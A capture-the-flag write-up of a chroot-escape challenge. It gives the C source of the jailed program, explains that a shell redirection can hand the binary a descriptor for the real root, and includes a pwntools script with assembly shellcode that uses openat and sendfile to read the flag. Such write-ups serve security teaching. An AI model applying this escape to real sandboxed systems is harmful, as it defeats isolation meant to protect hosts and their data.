#metadata(
  (
    title: "Chroot Escape via openat and ..",
    description: "Escaping a chroot jail by using openat with '..' relative to a pre-opened directory handle, or leveraging similar path traversal.",
    date: "2025-12-30",
    order: 8,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Chroot Escape via openat and ..

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

In this challenge, the program *does not* open a user-controlled file path before chrooting. This prevents the trivial "leak FD via argv[1]" method used in previous levels.

However, the program is a dynamically linked executable running in a standard environment. We can influence the file descriptors it starts with by manipulating the shell that invokes it.

By using shell redirection, we can open the root directory (`/`) on a specific file descriptor *before* the program starts. Since `chroot` only affects future path resolutions and doesn't close existing FDs (unless `O_CLOEXEC` is set, which shell redirection usually isn't), this FD will be available to our shellcode.

== Exploitation Plan

1.  **Inherit Root FD:** Invoke the binary using a shell command that opens `/` on file descriptor 3.
    *   Command: `./challenge 3< /`
2.  **Bypass Sandbox:** Use the `openat` syscall with FD 3. Since FD 3 points to the real root, `openat(3, "flag", ...)` will resolve the path relative to the host's root, bypassing the jail.
3.  **Read Flag:** Read the flag and write it to stdout.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# We use shell redirection to open '/' on FD 3 before the process starts.
# The '3</' syntax tells the shell to open '/' for reading on file descriptor 3.
command = f"{exe} 3< /"
p = process(command, shell=True)

shellcode = asm("""
    /* openat(3, "flag", O_RDONLY) */
    mov rdi, 3              /* dirfd: 3 (inherited from shell) */
    lea rsi, [rip + flag]   /* pathname: "flag" */
    xor rdx, rdx            /* flags: O_RDONLY */
    mov rax, 257            /* syscall: SYS_openat */
    syscall

    /* sendfile(1, fd, 0, 100) */
    mov rsi, rax            /* in_fd */
    mov rdi, 1              /* out_fd */
    xor rdx, rdx            /* offset */
    mov r10, 100            /* count */
    mov rax, 40             /* syscall: SYS_sendfile */
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

flag:
    .string "flag"
""")

p.send(shellcode)
p.interactive()
```
